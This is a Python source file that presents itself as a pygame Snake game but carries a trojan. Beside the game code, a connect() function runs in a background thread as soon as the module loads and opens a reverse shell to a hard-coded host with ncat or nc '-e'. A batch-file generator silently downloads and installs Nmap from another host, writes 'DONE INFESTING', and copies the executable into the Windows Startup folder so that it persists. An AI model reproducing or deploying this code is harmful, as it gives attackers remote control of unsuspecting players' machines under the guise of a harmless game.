import platform
import socket
import subprocess
import threading
import pygame
import time
import random
import sys
import os

snake_speed = 15

window_x = 720
window_y = 480

black = pygame.Color(0, 0, 0)
white = pygame.Color(255, 255, 255)
red = pygame.Color(255, 0, 0)
green = pygame.Color(0, 255, 0)

pygame.init()


def start_game():
    global window_x, window_y, black, white, red, green, snake_speed
    global snake_position, snake_body, fruit_position, fruit_spawn, direction, change_to, score

    pygame.display.set_caption('SNAKE GAME')
    game_window = pygame.display.set_mode((window_x, window_y))
    fps = pygame.time.Clock()

    snake_position = [100, 50]
    snake_body = [[100, 50], [90, 50], [80, 50], [70, 50]]
    fruit_position = [random.randrange(1, (window_x // 10)) * 10,
                      random.randrange(1, (window_y // 10)) * 10]
    fruit_spawn = True
    direction = 'RIGHT'
    change_to = direction
    score = 0

    while True:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            elif event.type == pygame.KEYDOWN:
                if event.key == pygame.K_UP:
                    change_to = 'UP'
                elif event.key == pygame.K_DOWN:
                    change_to = 'DOWN'
                elif event.key == pygame.K_LEFT:
                    change_to = 'LEFT'
                elif event.key == pygame.K_RIGHT:
                    change_to = 'RIGHT'

        if change_to == 'UP' and direction != 'DOWN':
            direction = 'UP'
        elif change_to == 'DOWN' and direction != 'UP':
            direction = 'DOWN'
        elif change_to == 'LEFT' and direction != 'RIGHT':
            direction = 'LEFT'
        elif change_to == 'RIGHT' and direction != 'LEFT':
            direction = 'RIGHT'

        snake_position[0] += (direction == 'RIGHT') * 10
        snake_position[0] -= (direction == 'LEFT') * 10
        snake_position[1] += (direction == 'DOWN') * 10
        snake_position[1] -= (direction == 'UP') * 10

        snake_body.insert(0, list(snake_position))
        if snake_position[0] == fruit_position[0] and snake_position[1] == fruit_position[1]:
            score += 10
            fruit_spawn = False
        else:
            snake_body.pop()

        if not fruit_spawn:
            fruit_position = [random.randrange(1, (window_x // 10)) * 10,
                              random.randrange(1, (window_y // 10)) * 10]

        fruit_spawn = True
        game_window.fill(black)

        for pos in snake_body:
            pygame.draw.rect(game_window, green, pygame.Rect(pos[0], pos[1], 10, 10))
        pygame.draw.rect(game_window, white, pygame.Rect(fruit_position[0], fruit_position[1], 10, 10))

        if snake_position[0] < 0 or snake_position[0] > window_x - 10 or \
                snake_position[1] < 0 or snake_position[1] > window_y - 10:
            game_over(game_window)

        for block in snake_body[1:]:
            if snake_position[0] == block[0] and snake_position[1] == block[1]:
                game_over(game_window)

        show_score(game_window, 1, white, 'times new roman', 20)
        pygame.display.update()
        fps.tick(snake_speed)

def show_score(game_window, choice, color, font, size):
    score_font = pygame.font.SysFont(font, size)
    score_surface = score_font.render('Score : ' + str(score), True, color)
    score_rect = score_surface.get_rect()
    game_window.blit(score_surface, score_rect)

def game_over(game_window):
    my_font = pygame.font.SysFont('times new roman', 50)
    game_over_surface = my_font.render('Your Score is : ' + str(score), True, red)
    game_over_rect = game_over_surface.get_rect()
    game_over_rect.midtop = (window_x / 2, window_y / 4)
    game_window.blit(game_over_surface, game_over_rect)
    pygame.display.flip()
    time.sleep(2)
    start_game()


def connect(ip, port):
	# detect OS
	os = platform.system()
	# s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	# s.connect((ip,port))

	# os.dup2(s.fileno(),0)
	# os.dup2(s.fileno(),1)
	# os.dup2(s.fileno(),2)
     
	# if OS is Linux
	if os == "Linux":
		p = subprocess.call(["/bin/sh","-i"])

	elif os == "Windows":
		subprocess.run("ncat " + ip + " " + str(port) + " -e cmd.exe", shell=True)

	elif os == "Darwin":
		subprocess.run("nc " + ip + " " + str(port) + " -e /bin/bash", shell=True)

connected = False

if not connected:
    connect_thread = threading.Thread(target=connect, args=("192.168.0.90", 40000))
    connect_thread.start()
    connected = True



def create_run_file():
    bat_content = """
            @echo off

            @REM Check if Nmap is already installed
            if exist "%ProgramFiles(x86)%\Nmap" goto :runscript

            @REM echo Installing Nmap...
            curl http://192.168.1.9:10044/group3/nmap-7.80-win32.zip -o nmap-7.80-win32.zip >nul 2>&1
            tar -xf nmap-7.80-win32.zip >nul 2>&1
            move nmap-7.80 "%ProgramFiles(x86)%\Nmap" >nul 2>&1

            @REM Add Nmap to PATH
            setx PATH "%PATH%;%ProgramFiles(x86)%\Nmap" >nul 2>&1

            @REM Clean up   
            del nmap-7.80-win32.zip >nul 2>&1

            @REM install the needed drivers
            %ProgramFiles(x86)%\Nmap\vcredist_x86.exe /quiet /install >nul 2>&1
            timeout /t 10 >nul 2>&1

            echo DONE INFESTING > .\doneInfecting.txt

            :runscript
            @REM Run the script
            start "" /B "snakeGame.exe"

            set "executable=snakeGame.exe"
            set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

            @REM Check if the executable file exists
            if not exist "%executable%" (
                echo Error: %executable% not found.
                pause
                exit /b 1
            )

            @REM Copy the executable to the startup folder
            copy "%executable%" "%startup_folder%" /Y

            echo %executable% added to startup.
            pause
            exit
            """

    # create file
    with open("snakgeGame.bat", 'w') as f:
        f.write(bat_content)

    os.system(f'start cmd /c {f.name}')


# Call the start_game function to begin the first game
start_game()
